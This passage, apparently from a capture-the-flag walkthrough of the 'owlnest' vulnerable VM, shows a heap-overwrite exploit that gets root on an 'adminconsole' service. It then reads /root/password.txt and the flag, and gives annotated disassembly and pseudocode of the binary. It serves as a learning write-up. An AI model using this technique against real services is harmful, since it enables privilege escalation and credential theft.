<span class="hll">ssh -i id_rsa rmp@owlnest.com
</span><span class="c1"># adminconsole expects &quot;\r\n&quot; terminator in the password file</span>
<span class="nb">printf</span> <span class="s2">&quot;password\r\n&quot;</span> &gt; /tmp/password.txt
<span class="nb">exit</span>
</pre></div>
</div>
<p>Linux memory is allocated in chunks of not less that 16 bytes in a 32-bit system, 24 bytes for 64-bit system (see <a class="reference external" href="http://gee.cs.oswego.edu/dl/html/malloc.html">A Memory Allocator</a>). So auth+32 is around 1 or 2 chunks after auth. Memory is hopefully allocated sequentially, so memory allocation for command privs should follow that of command username (which allocated global auth). If memory allocation for privs is the next chunk, you’ll need 16 bytes filler to get to auth+32. So we’ll try that in our first run of adminconsole:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">socat - TCP-LISTEN:owlnest.com:31337
</span><span class="hll">username this_is_ignored
</span><span class="hll">privs <span class="m">1234567890123456</span>/tmp/password.txt
</span><span class="hll">login
</span><span class="c1"># results in</span>
<span class="c1"># Access Granted!</span>
<span class="c1"># Dropping into /bin/sh</span>
<span class="hll">id
</span><span class="c1"># results in</span>
<span class="hll"><span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span>
</span>ls /root
<span class="c1"># results in</span>
<span class="c1"># flag.txt</span>
<span class="c1"># password.txt</span>
<span class="hll">cat /root/password.txt
</span><span class="c1"># results in</span>
<span class="c1"># _th1s1s45up3r53cr3tPassW0rd!</span>
<span class="hll">cat /root/flag.txt
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1">#                \ `-._......_.-` /</span>
</span><span class="hll"><span class="c1">#                 `.  &#39;.    .&#39;  .&#39;    Oh Well, in the end you did it!</span>
</span><span class="hll"><span class="c1">#                  //  _`\/`_  \\     You stopped the olws&#39; evil plan</span>
</span><span class="hll"><span class="c1">#                 ||  /\O||O/\  ||    By pwning their secret base you</span>
</span><span class="hll"><span class="c1">#                 |\  \_/||\_/  /|    saved the world!</span>
</span><span class="hll"><span class="c1">#                 \ &#39;.   \/   .&#39; /</span>
</span><span class="hll"><span class="c1">#                 / ^ `&#39;~  ~&#39;`   \</span>
</span><span class="hll"><span class="c1">#                /  _-^_~ -^_ ~-  |</span>
</span><span class="hll"><span class="c1">#                | / ^_ -^_- ~_^\ |</span>
</span><span class="hll"><span class="c1">#                | |~_ ^- _-^_ -| |</span>
</span><span class="hll"><span class="c1">#                | \  ^-~_ ~-_^ / |</span>
</span><span class="hll"><span class="c1">#                \_/;-.,____,.-;\_/</span>
</span><span class="hll"><span class="c1">#         ==========(_(_(==)_)_)=========</span>
</span><span class="hll"><span class="c1">#</span>
</span><span class="hll"><span class="c1"># The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4</span>
</span><span class="hll"><span class="c1">#</span>
</span><span class="hll"><span class="c1"># Hope you enjoyed this vulnerable VM.</span>
</span><span class="hll"><span class="c1"># Looking forward to see a writeup from you soon!</span>
</span><span class="hll"><span class="c1"># don&#39;t forget to ping me on twitter with your thoughts</span>
</span><span class="hll"><span class="c1">#</span>
</span><span class="hll"><span class="c1"># Sincerely</span>
</span><span class="hll"><span class="c1"># @Swappage</span>
</span><span class="hll"><span class="c1">#</span>
</span><span class="hll"><span class="c1">#</span>
</span><span class="hll"><span class="c1"># PS: why the owls? oh well, I really don&#39;t know and yes: i really suck at fictioning :p</span>
</span><span class="hll"><span class="c1"># True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first</span>
</span></pre></div>
</div>
<p>And we’re lucky to be done. Based on differences in memory allocation we may have to had different fillers tried, but we got the next chunk and 16 bytes filler worked.</p>
</div>
<div class="section" id="detailed-code-analysis">
<h4>3.2.3.2.6. Detailed code analysis<a class="headerlink" href="#detailed-code-analysis" title="Permalink to this headline">¶</a></h4>
<p>Dump of assembler code for function loadPasswordFromFile:</p>
<div class="highlight-objdump notranslate"><div class="highlight"><pre><span></span><span class="x">0x080484be &lt;+0&gt;:    push   ebp</span>
<span class="x">0x080484bf &lt;+1&gt;:    mov    ebp,esp</span>
<span class="x">0x080484c1 &lt;+3&gt;:    sub    esp,0x28                             # stack size 40b</span>
<span class="x">0x080484c4 &lt;+6&gt;:    mov    DWORD PTR [esp+0x4],0x80abad4        # stack(4) = addr &quot;\r\n&quot;</span>
<span class="x">0x080484cc &lt;+14&gt;:   mov    eax,DWORD PTR [ebp+0x8]              # stack(0) = ARG1</span>
<span class="x">0x080484cf &lt;+17&gt;:   mov    DWORD PTR [esp],eax                  #</span>
<span class="x">0x080484d2 &lt;+20&gt;:   call   0x8057950 &lt;strtok&gt;                   # strtok(ARG1, &quot;\r\n&quot;)</span>
<span class="x">0x080484d7 &lt;+25&gt;:   mov    DWORD PTR [ebp-0x10],eax             # stack(24)=strtok()</span>
<span class="x">0x080484da &lt;+28&gt;:   mov    DWORD PTR [esp+0x4],0x80abbb8        # stack(4) = addr &quot;rb&quot;</span>
<span class="x">0x080484e2 &lt;+36&gt;:   mov    eax,DWORD PTR [ebp-0x10]             # stack(0) = strtok()</span>
<span class="x">0x080484e5 &lt;+39&gt;:   mov    DWORD PTR [esp],eax                  #</span>
<span class="x">0x080484e8 &lt;+42&gt;:   call   0x8049f10 &lt;fopen&gt;                    # fopen(strtok(),&quot;rb&quot;)</span>
<span class="x">0x080484ed &lt;+47&gt;:   mov    DWORD PTR [ebp-0xc],eax              # stack(28)=fopen()</span>
<span class="x">0x080484f0 &lt;+50&gt;:   cmp    DWORD PTR [ebp-0xc],0x0              # open worked?</span>
<span class="x">0x080484f4 &lt;+54&gt;:   jne    0x804850d &lt;loadPasswordFromFile+79&gt;  # yes = skip read &quot;/root/password.txt&quot;</span>
<span class="x">0x080484f6 &lt;+56&gt;:   mov    DWORD PTR [esp+0x4],0x80abbb8        # stack(4) = &quot;rb&quot;</span>
<span class="x">0x080484fe &lt;+64&gt;:   mov    DWORD PTR [esp],0x80abbbb            # stack(0) = &quot;/root/password.txt&quot;</span>
<span class="x">0x08048505 &lt;+71&gt;:   call   0x8049f10 &lt;fopen&gt;                    # no = read &quot;/root/password.txt&quot;</span>
<span class="x">0x0804850a &lt;+76&gt;:   mov    DWORD PTR [ebp-0xc],eax              # stack(28)=fopen()</span>
<span class="x">0x0804850d &lt;+79&gt;:   mov    DWORD PTR [esp+0x8],0x2              # stack(8) = 2</span>
<span class="x">0x08048515 &lt;+87&gt;:   mov    DWORD PTR [esp+0x4],0x0              # stack(4) = 0</span>
<span class="x">0x0804851d &lt;+95&gt;:   mov    eax,DWORD PTR [ebp-0xc]              # stack(0) = fopen()</span>
<span class="x">0x08048520 &lt;+98&gt;:   mov    DWORD PTR [esp],eax                  #</span>
<span class="x">0x08048523 &lt;+101&gt;:  call   0x804a720 &lt;fseek&gt;                    # fseek(fopen(),0,2)</span>
<span class="x">0x08048528 &lt;+106&gt;:  mov    eax,DWORD PTR [ebp-0xc]              # stack(0) = fopen()</span>
<span class="x">0x0804852b &lt;+109&gt;:  mov    DWORD PTR [esp],eax                  #</span>
<span class="x">0x0804852e &lt;+112&gt;:  call   0x804a070 &lt;ftell&gt;                    # ftell(fopen())</span>
<span class="x">0x08048533 &lt;+117&gt;:  mov    DWORD PTR [ebp-0x14],eax             # stack(20) = ftell()</span>
<span class="x">0x08048536 &lt;+120&gt;:  mov    DWORD PTR [esp+0x8],0x0              # stack(8) = 0</span>
<span class="x">0x0804853e &lt;+128&gt;:  mov    DWORD PTR [esp+0x4],0x0              # stack(4) = 0</span>
<span class="x">0x08048546 &lt;+136&gt;:  mov    eax,DWORD PTR [ebp-0xc]              # stack(0) = fopen()</span>
<span class="x">0x08048549 &lt;+139&gt;:  mov    DWORD PTR [esp],eax                  #</span>
<span class="x">0x0804854c &lt;+142&gt;:  call   0x804a720 &lt;fseek&gt;                    # fseek(fopen(),0,0)</span>
<span class="x">0x08048551 &lt;+147&gt;:  mov    eax,DWORD PTR [ebp-0x14]             # stack(0) = ftell()+1</span>
<span class="x">0x08048554 &lt;+150&gt;:  add    eax,0x1                              #</span>
<span class="x">0x08048557 &lt;+153&gt;:  mov    DWORD PTR [esp],eax                  #</span>
<span class="x">0x0804855a &lt;+156&gt;:  call   0x8055550 &lt;malloc&gt;                   # malloc(ftell()+1)</span>
<span class="x">0x0804855f &lt;+161&gt;:  mov    DWORD PTR [ebp-0x18],eax             # stack(16) = malloc()</span>
<span class="x">0x08048562 &lt;+164&gt;:  cmp    DWORD PTR [ebp-0x18],0x0             # worked?</span>
<span class="x">0x08048566 &lt;+168&gt;:  jne    0x8048590 &lt;loadPasswordFromFile+210&gt; # jump if worked</span>
<span class="x">0x08048568 &lt;+170&gt;:  mov    eax,ds:0x80ca4c4                     # failed so err msg</span>
<span class="x">0x0804856d &lt;+175&gt;:  mov    DWORD PTR [esp+0xc],eax              # stack(12) = STDERR</span>
<span class="x">0x08048571 &lt;+179&gt;:  mov    DWORD PTR [esp+0x8],0x1b             # stack(8) = 27</span>
<span class="x">0x08048579 &lt;+187&gt;:  mov    DWORD PTR [esp+0x4],0x1              # stack(4) = 1</span>
<span class="x">0x08048581 &lt;+195&gt;:  mov    DWORD PTR [esp],0x80abbce            # stack(0) = &quot;Unable to allocate buffer\r\n&quot;</span>
<span class="x">0x08048588 &lt;+202&gt;:  call   0x804a220 &lt;fwrite&gt;                   # fwrite(error message)</span>
<span class="x">0x0804858d &lt;+207&gt;:  nop                                         #</span>
<span class="x">0x0804858e &lt;+208&gt;:  jmp    0x80485bf &lt;loadPasswordFromFile+257&gt; # return from routine</span>
<span class="x">0x08048590 &lt;+210&gt;:  mov    eax,DWORD PTR [ebp-0xc]              # stack(12) = fopen()</span>
<span class="x">0x08048593 &lt;+213&gt;:  mov    DWORD PTR [esp+0xc],eax              #</span>
<span class="x">0x08048597 &lt;+217&gt;:  mov    eax,DWORD PTR [ebp-0x14]             # stack(8) = ftell()</span>
<span class="x">0x0804859a &lt;+220&gt;:  mov    DWORD PTR [esp+0x8],eax              #</span>
<span class="x">0x0804859e &lt;+224&gt;:  mov    DWORD PTR [esp+0x4],0x1              # stack(4) = 1</span>
<span class="x">0x080485a6 &lt;+232&gt;:  mov    eax,DWORD PTR [ebp-0x18]             # stack(0) = malloc()</span>
<span class="x">0x080485a9 &lt;+235&gt;:  mov    DWORD PTR [esp],eax                  #</span>
<span class="x">0x080485ac &lt;+238&gt;:  call   0x8049f40 &lt;fread&gt;                    # fread(malloc(), ftell(), fopen())</span>
<span class="x">0x080485b1 &lt;+243&gt;:  mov    eax,DWORD PTR [ebp-0xc]              # stack(0) = fopen()</span>
<span class="x">0x080485b4 &lt;+246&gt;:  mov    DWORD PTR [esp],eax                  #</span>
<span class="x">0x080485b7 &lt;+249&gt;:  call   0x8049980 &lt;fclose&gt;                   # fclose(fopen())</span>
<span class="x">0x080485bc &lt;+254&gt;:  mov    eax,DWORD PTR [ebp-0x18]             # RETURN malloc()</span>
<span class="x">0x080485bf &lt;+257&gt;:  leave</span>
<span class="x">0x080485c0 &lt;+258&gt;:  ret</span>
</pre></div>
</div>
<p>This corresponds to the following pseudocode that tries to read passwords from the input filename string, but reads from <code class="file docutils literal notranslate"><span class="pre">/root/password.txt</span></code> if it can’t.</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="n">ptr</span> <span class="nf">loadPasswordFromFile</span><span class="p">(</span><span class="n">str</span><span class="o">*</span> <span class="n">fileName</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// Get filename from argument</span>
  <span class="n">filename</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">ARG1</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
  <span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s">&quot;rb&quot;</span><span class="p">)</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;/root/password.txt&quot;</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">)</span>
  <span class="p">}</span>
  <span class="n">fseek</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
  <span class="n">fseek</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
  <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Unable to allocate buffer</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">buffer</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Dump of assembler code for function main:</p>
<div class="highlight-objdump notranslate"><div class="highlight"><pre><span></span><span class="x">0x080485c1 &lt;+0&gt;:    push   ebp</span>
<span class="x">0x080485c2 &lt;+1&gt;:    mov    ebp,esp</span>
<span class="x">0x080485c4 &lt;+3&gt;:    and    esp,0xfffffff0</span>
<span class="x">0x080485c7 &lt;+6&gt;:    sub    esp,0xa0                          # stack size 160b</span>
<span class="x">0x080485cd &lt;+12&gt;:   call   0x8048254 &lt;printBanner&gt;           # printBanner</span>
<span class="x">0x080485d2 &lt;+17&gt;:   jmp    0x80485d5 &lt;main+20&gt;</span>
<span class="x">0x080485d4 &lt;+19&gt;:   nop</span>
<span class="x">0x080485d5 &lt;+20&gt;:   mov    DWORD PTR [esp],0x80abbea         # &quot;Ready:&quot;</span>
<span class="x">0x080485dc &lt;+27&gt;:   call   0x8049950 &lt;printf&gt;                # print &quot;Ready:&quot;</span>
<span class="x">0x080485e1 &lt;+32&gt;:   mov    eax,ds:0x80ca4c0                  # arg1=STDOUT</span>
<span class="x">0x080485e6 &lt;+37&gt;:   mov    DWORD PTR [esp],eax</span>
<span class="x">0x080485e9 &lt;+40&gt;:   call   0x8049b70 &lt;fflush&gt;                # flush(STDOUT)</span>
<span class="x">0x080485ee &lt;+45&gt;:   mov    eax,ds:0x80ca4bc                  # STDIN</span>
<span class="x">0x080485f3 &lt;+50&gt;:   mov    DWORD PTR [esp+0x8],eax           # arg3=STDIN</span>
<span class="x">0x080485f7 &lt;+54&gt;:   mov    DWORD PTR [esp+0x4],0x80          # arg2=128</span>
<span class="x">0x080485ff &lt;+62&gt;:   lea    eax,[esp+0x18]                    # stack(24) is input</span>
<span class="x">0x08048603 &lt;+66&gt;:   mov    DWORD PTR [esp],eax               # arg1=input</span>
<span class="x">0x08048606 &lt;+69&gt;:   call   0x8049c70 &lt;fgets&gt;                 # fgets(input,128b,STDIN)</span>
<span class="x">0x0804860b &lt;+74&gt;:   test   eax,eax                           #</span>
<span class="x">0x0804860d &lt;+76&gt;:   je     0x8048897 &lt;main+726&gt;              # exit on 0x0</span>
<span class="x">0x08048613 &lt;+82&gt;:   mov    DWORD PTR [esp+0x8],0x4           # *help* arg3=4</span>
<span class="x">0x0804861b &lt;+90&gt;:   mov    DWORD PTR [esp+0x4],0x80abbf2     # arg2=&quot;help&quot;</span>
<span class="x">0x08048623 &lt;+98&gt;:   lea    eax,[esp+0x18]                    # arg1=input</span>
<span class="x">0x08048627 &lt;+102&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x0804862a &lt;+105&gt;:  call   0x8056d80 &lt;strncmp&gt;               # strncmp(input,&quot;help&quot;,4)</span>
<span class="x">0x0804862f &lt;+110&gt;:  test   eax,eax                           # user input = &quot;help&quot;?</span>
<span class="x">0x08048631 &lt;+112&gt;:  jne    0x8048638 &lt;main+119&gt;              # no, skip to *privs *</span>
<span class="x">0x08048633 &lt;+114&gt;:  call   0x80483ae &lt;printHelp&gt;             # yes, call printHelp</span>
<span class="x">0x08048638 &lt;+119&gt;:  mov    DWORD PTR [esp+0x8],0x6           # *privs * arg3=6</span>
<span class="x">0x08048640 &lt;+127&gt;:  mov    DWORD PTR [esp+0x4],0x80abbf7     # arg2=&quot;privs &quot;</span>
<span class="x">0x08048648 &lt;+135&gt;:  lea    eax,[esp+0x18]                    # arg1=input</span>
<span class="x">0x0804864c &lt;+139&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x0804864f &lt;+142&gt;:  call   0x8056d80 &lt;strncmp&gt;               # strncmp(input,&quot;privs &quot;,6)</span>
<span class="x">0x08048654 &lt;+147&gt;:  test   eax,eax                           # input=&quot;privs &quot;?</span>
<span class="x">0x08048656 &lt;+149&gt;:  jne    0x804866c &lt;main+171&gt;              # no, skip to *password * check</span>
<span class="x">0x08048658 &lt;+151&gt;:  lea    eax,[esp+0x18]                    # yes, get input after privs</span>
<span class="x">0x0804865c &lt;+155&gt;:  add    eax,0x6                           # skip first 6 input bytes</span>
<span class="x">0x0804865f &lt;+158&gt;:  mov    DWORD PTR [esp],eax               # arg1 = user input w/o 6 bytes</span>
<span class="x">0x08048662 &lt;+161&gt;:  call   0x8056c80 &lt;strdup&gt;                # strdup(input[6:])</span>
<span class="x">0x08048667 &lt;+166&gt;:  mov    ds:0x80cc304,eax                  # &lt;privileges&gt; = strdup()</span>
<span class="x">0x0804866c &lt;+171&gt;:  mov    DWORD PTR [esp+0x8],0x9           # *password * arg3=9</span>
<span class="x">0x08048674 &lt;+179&gt;:  mov    DWORD PTR [esp+0x4],0x80abbfe     # arg2=&quot;password &quot;</span>
<span class="x">0x0804867c &lt;+187&gt;:  lea    eax,[esp+0x18]                    # arg1=input</span>
<span class="x">0x08048680 &lt;+191&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x08048683 &lt;+194&gt;:  call   0x8056d80 &lt;strncmp&gt;               # strncmp(input,&quot;password &quot;,9)</span>
<span class="x">0x08048688 &lt;+199&gt;:  test   eax,eax                           # input=&quot;password &quot;?</span>
<span class="x">0x0804868a &lt;+201&gt;:  jne    0x80486fa &lt;main+313&gt;              # no, skip to *username * check</span>
<span class="x">0x0804868c &lt;+203&gt;:  lea    eax,[esp+0x18]                    # yes, skip first 9 bytes user input</span>
<span class="x">0x08048690 &lt;+207&gt;:  add    eax,0x9</span>
<span class="x">0x08048693 &lt;+210&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x08048696 &lt;+213&gt;:  call   0x8056cd0 &lt;strlen&gt;                # strlen(input w/o 9 bytes)</span>
<span class="x">0x0804869b &lt;+218&gt;:  cmp    eax,0x1e                          # strlen() &gt; 30?</span>
<span class="x">0x0804869e &lt;+221&gt;:  ja     0x80486fa &lt;main+313&gt;              # yes, skip to &quot;username &quot; check</span>
<span class="x">0x080486a0 &lt;+223&gt;:  mov    eax,ds:0x80cc2c0                  # &lt;auth&gt; = 0?</span>
<span class="x">0x080486a5 &lt;+228&gt;:  test   eax,eax                           #</span>
<span class="x">0x080486a7 &lt;+230&gt;:  je     0x80486fa &lt;main+313&gt;              # yes, skip to *username *</span>
<span class="x">0x080486a9 &lt;+232&gt;:  mov    DWORD PTR [esp+0x8],0x1f          # arg3=31</span>
<span class="x">0x080486b1 &lt;+240&gt;:  lea    eax,[esp+0x18]                    # arg2=input[9:]</span>
<span class="x">0x080486b5 &lt;+244&gt;:  add    eax,0x9</span>
<span class="x">0x080486b8 &lt;+247&gt;:  mov    DWORD PTR [esp+0x4],eax</span>
<span class="mh">0x080486bc</span> <span class="p">&lt;</span><span class="nf">+251&gt;:  mov    DWORD PTR [esp],0x80cc2e0         # arg1=&lt;yourpassword</span><span class="p">&gt;:</span>
<span class="x">0x080486c3 &lt;+258&gt;:  call   0x8056e30 &lt;strncpy&gt;               # strncpy(&lt;yourpassword&gt;,input[9:],31)</span>
<span class="x">0x080486c8 &lt;+263&gt;:  mov    eax,ds:0x80cc2c0                  # arg1=&lt;auth&gt;[32:]</span>
<span class="x">0x080486cd &lt;+268&gt;:  add    eax,0x20</span>
<span class="x">0x080486d0 &lt;+271&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x080486d3 &lt;+274&gt;:  call   0x80484be &lt;loadPasswordFromFile&gt;  # call loadPasswordFromFile</span>
<span class="x">0x080486d8 &lt;+279&gt;:  mov    ds:0x80cc300,eax                  # &lt;pwd&gt;=read in password</span>
<span class="x">0x080486dd &lt;+284&gt;:  mov    eax,ds:0x80cc300                  #</span>
<span class="x">0x080486e2 &lt;+289&gt;:  mov    DWORD PTR [esp+0x8],0x1f          # arg3=31</span>
<span class="x">0x080486ea &lt;+297&gt;:  mov    DWORD PTR [esp+0x4],eax           # arg2=&lt;pwd&gt;</span>
<span class="x">0x080486ee &lt;+301&gt;:  mov    DWORD PTR [esp],0x80cc2a0         # arg1=&lt;password&gt;</span>
<span class="x">0x080486f5 &lt;+308&gt;:  call   0x8056e30 &lt;strncpy&gt;               # strncpy(&lt;password&gt;,&lt;pwd&gt;,31)</span>
<span class="x">0x080486fa &lt;+313&gt;:  mov    DWORD PTR [esp+0x8],0x9           # *username *, arg3=9</span>
<span class="x">0x08048702 &lt;+321&gt;:  mov    DWORD PTR [esp+0x4],0x80abc08     # arg2=&quot;username &quot;</span>
<span class="x">0x0804870a &lt;+329&gt;:  lea    eax,[esp+0x18]                    # arg1=input</span>
<span class="x">0x0804870e &lt;+333&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x08048711 &lt;+336&gt;:  call   0x8056d80 &lt;strncmp&gt;               # strncmp(input,&quot;username &quot;,9)</span>
<span class="x">0x08048716 &lt;+341&gt;:  test   eax,eax                           # input=&quot;username&quot;?</span>
<span class="x">0x08048718 &lt;+343&gt;:  jne    0x8048768 &lt;main+423&gt;              # no, skip to *login* check</span>
<span class="x">0x0804871a &lt;+345&gt;:  mov    DWORD PTR [esp],0x4</span>
<span class="x">0x08048721 &lt;+352&gt;:  call   0x8055550 &lt;malloc&gt;                # malloc(4)</span>
<span class="x">0x08048726 &lt;+357&gt;:  mov    ds:0x80cc2c0,eax                  # &lt;auth&gt;=malloc(4)</span>
<span class="x">0x0804872b &lt;+362&gt;:  mov    eax,ds:0x80cc2c0                  #</span>
<span class="x">0x08048730 &lt;+367&gt;:  mov    DWORD PTR [esp+0x8],0x4           # arg3=4</span>
<span class="x">0x08048738 &lt;+375&gt;:  mov    DWORD PTR [esp+0x4],0x0           # arg2=0</span>
<span class="x">0x08048740 &lt;+383&gt;:  mov    DWORD PTR [esp],eax               # arg1=&lt;auth&gt;</span>
<span class="x">0x08048743 &lt;+386&gt;:  call   0x8057cc0 &lt;memset&gt;                # memset(&lt;auth&gt;,0,4)</span>
<span class="x">0x08048748 &lt;+391&gt;:  mov    eax,ds:0x80cc2c0                  # &lt;auth&gt;</span>
<span class="x">0x0804874d &lt;+396&gt;:  add    eax,0x20                          # &lt;auth&gt;+32</span>
<span class="x">0x08048750 &lt;+399&gt;:  mov    DWORD PTR [esp+0x8],0x1f          # arg3=31</span>
<span class="x">0x08048758 &lt;+407&gt;:  mov    DWORD PTR [esp+0x4],0x80abc12     # arg2=&quot;/root/password.txt&quot;</span>
<span class="x">0x08048760 &lt;+415&gt;:  mov    DWORD PTR [esp],eax               # arg1=&lt;auth&gt;+32</span>
<span class="x">0x08048763 &lt;+418&gt;:  call   0x8056e30 &lt;strncpy&gt;               # &lt;auth&gt;+32=&quot;/root/password.txt&quot;</span>
<span class="x">0x08048768 &lt;+423&gt;:  mov    DWORD PTR [esp+0x8],0x4           # *login*, arg3=4</span>
<span class="x">0x08048770 &lt;+431&gt;:  mov    DWORD PTR [esp+0x4],0x80abc26     # arg2=&quot;login&quot;</span>
<span class="x">0x08048778 &lt;+439&gt;:  lea    eax,[esp+0x18]                    # arg1=input</span>
<span class="x">0x0804877c &lt;+443&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x0804877f &lt;+446&gt;:  call   0x8056d80 &lt;strncmp&gt;               # strncmp(input,&quot;login&quot;,4)</span>
<span class="x">0x08048784 &lt;+451&gt;:  test   eax,eax                           # user input = &quot;logi&quot;?</span>
<span class="x">0x08048786 &lt;+453&gt;:  jne    0x80485d4 &lt;main+19&gt;               # no, back to top of main</span>
<span class="x">0x0804878c &lt;+459&gt;:  mov    eax,0x80cc2e0                     # &lt;yourpassword&gt;</span>
<span class="x">0x08048791 &lt;+464&gt;:  movzx  eax,BYTE PTR [eax]                #</span>
<span class="x">0x08048794 &lt;+467&gt;:  test   al,al                             # &lt;yourpassword&gt; empty?</span>
<span class="x">0x08048796 &lt;+469&gt;:  je     0x80487a4 &lt;main+483&gt;              # not set, jump to err msg</span>
<span class="x">0x08048798 &lt;+471&gt;:  mov    eax,0x80cc2a0                     # &lt;password&gt;</span>
<span class="x">0x0804879d &lt;+476&gt;:  movzx  eax,BYTE PTR [eax]</span>
<span class="x">0x080487a0 &lt;+479&gt;:  test   al,al                             # &lt;password&gt; empty?</span>
<span class="x">0x080487a2 &lt;+481&gt;:  jne    0x80487ce &lt;main+525&gt;              # if set, jump to pwd check</span>
<span class="x">0x080487a4 &lt;+483&gt;:  mov    eax,ds:0x80ca4c0                  # STDOUT</span>
<span class="x">0x080487a9 &lt;+488&gt;:  mov    DWORD PTR [esp+0xc],eax</span>
<span class="x">0x080487ad &lt;+492&gt;:  mov    DWORD PTR [esp+0x8],0x1e</span>
<span class="x">0x080487b5 &lt;+500&gt;:  mov    DWORD PTR [esp+0x4],0x1</span>
<span class="x">0x080487bd &lt;+508&gt;:  mov    DWORD PTR [esp],0x80abc2c         # &quot;Username or Password not set\r\n&quot;</span>
<span class="x">0x080487c4 &lt;+515&gt;:  call   0x804a220 &lt;fwrite&gt;                # fwrite()</span>
<span class="x">0x080487c9 &lt;+520&gt;:  jmp    0x80485d4 &lt;main+19&gt;               # loop to top of main</span>
<span class="x">0x080487ce &lt;+525&gt;:  mov    DWORD PTR [esp+0x4],0x80abad4     # arg2=&quot;\r\n&quot;</span>
<span class="x">0x080487d6 &lt;+533&gt;:  mov    DWORD PTR [esp],0x80cc2a0         # arg1=&lt;password&gt;</span>
<span class="x">0x080487dd &lt;+540&gt;:  call   0x8057950 &lt;strtok&gt;                # strtok(&lt;password&gt;,&quot;\r\n&quot;)</span>
<span class="x">0x080487e2 &lt;+545&gt;:  mov    DWORD PTR [esp+0x9c],eax          # stack(156) = password</span>
<span class="x">0x080487e9 &lt;+552&gt;:  mov    DWORD PTR [esp+0x4],0x80abad4     # arg2=&quot;\r\n&quot;</span>
<span class="x">0x080487f1 &lt;+560&gt;:  mov    DWORD PTR [esp],0x80cc2e0         # &lt;yourpassword&gt;</span>
<span class="x">0x080487f8 &lt;+567&gt;:  call   0x8057950 &lt;strtok&gt;                # strtok(&lt;yourpassword&gt;,&quot;\r\n&quot;)</span>
<span class="x">0x080487fd &lt;+572&gt;:  mov    DWORD PTR [esp+0x98],eax          # stack(152) = yourpassword</span>
<span class="x">0x08048804 &lt;+579&gt;:  mov    DWORD PTR [esp+0x8],0x20          # arg3=32</span>
<span class="x">0x0804880c &lt;+587&gt;:  mov    eax,DWORD PTR [esp+0x98]          # arg2=yourpassword</span>
<span class="x">0x08048813 &lt;+594&gt;:  mov    DWORD PTR [esp+0x4],eax</span>
<span class="x">0x08048817 &lt;+598&gt;:  mov    eax,DWORD PTR [esp+0x9c]          # arg1=password</span>
<span class="x">0x0804881e &lt;+605&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x08048821 &lt;+608&gt;:  call   0x8056d80 &lt;strncmp&gt;               # strncmp(password,yourpassword,32)</span>
<span class="x">0x08048826 &lt;+613&gt;:  test   eax,eax                           # password match?</span>
<span class="x">0x08048828 &lt;+615&gt;:  jne    0x804886d &lt;main+684&gt;              # if not, jump to err msg</span>
<span class="x">0x0804882a &lt;+617&gt;:  mov    eax,ds:0x80ca4c0                  # arg4=STDOUT</span>
<span class="x">0x0804882f &lt;+622&gt;:  mov    DWORD PTR [esp+0xc],eax</span>
<span class="x">0x08048833 &lt;+626&gt;:  mov    DWORD PTR [esp+0x8],0x28          # arg3=40</span>
<span class="x">0x0804883b &lt;+634&gt;:  mov    DWORD PTR [esp+0x4],0x1           # arg2=1</span>
<span class="x">0x08048843 &lt;+642&gt;:  mov    DWORD PTR [esp],0x80abc4c         # arg1=&quot;Access Granted!\r\nDropping into /bin/sh\r\n&quot;</span>
<span class="x">0x0804884a &lt;+649&gt;:  call   0x804a220 &lt;fwrite&gt;                # fwrite(&quot;Access Granted!\r\nDropping into /bin/sh\r\n&quot;)</span>
<span class="x">0x0804884f &lt;+654&gt;:  mov    eax,ds:0x80ca4c0                  # STDOUT</span>
<span class="x">0x08048854 &lt;+659&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x08048857 &lt;+662&gt;:  call   0x8049b70 &lt;fflush&gt;                # fflush(STDOUT)</span>
